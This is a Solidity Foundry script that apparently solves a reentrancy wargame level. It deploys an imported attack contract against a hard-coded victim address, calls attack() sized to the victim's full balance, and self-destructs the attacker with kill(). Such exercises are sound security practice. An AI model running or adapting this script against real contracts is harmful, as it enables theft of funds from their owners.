// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/src/Script.sol";
import "forge-std/src/Test.sol";

import {ReentranceAttack} from "../ReentranceAttack.sol";
import {IReentrance} from "../IReentrance.sol";

contract ReentranceAttackScript is Script, Test {
  ReentranceAttack private reentranceAttack;
  address payable private reentranceInstance = 0xb301285a6f0bd5B7CDDBD03Ef7756646eF35fFc9;
  address payable private attackerAddress = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;

  IReentrance private victimContract = IReentrance(reentranceInstance);

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(deployerPrivateKey);

    uint256 initialBalanceOfInstance = reentranceInstance.balance;

    console2.log("----------------------------------------------------------");
    console2.log("initialBalanceOfInstance", initialBalanceOfInstance);
    console2.log("----------------------------------------------------------");

    reentranceAttack = new ReentranceAttack(reentranceInstance, attackerAddress);

    reentranceAttack.attack{value: initialBalanceOfInstance}();
    reentranceAttack.kill();

    vm.stopBroadcast();
  }
}
